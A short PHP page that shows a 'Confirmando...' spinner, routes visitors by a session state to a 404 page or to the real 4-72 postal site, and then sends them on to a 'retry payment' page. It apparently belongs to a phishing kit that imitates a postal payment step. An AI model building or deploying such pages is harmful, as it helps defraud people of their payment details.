<?php

session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    

    <title>Confirmando...</title>
    
  <style>

*{
  margin: 0;
  padding: 0;
  font-family: Arial, Helvetica, sans-serif;
}
</style>

</head>
<body style="">


<center>
  <div style="width: 90%;margin-top: 45%;">    
    <div class="spinner-container">
      <div class="spinner"></div>
  </div>
</center>

</div>

<script>
    // Redirigir a otra página después de 5 segundos
setTimeout(function() {
  window.location.href = "/reintentar_pago.php";
}, 15000);

</script>

</body>
</html>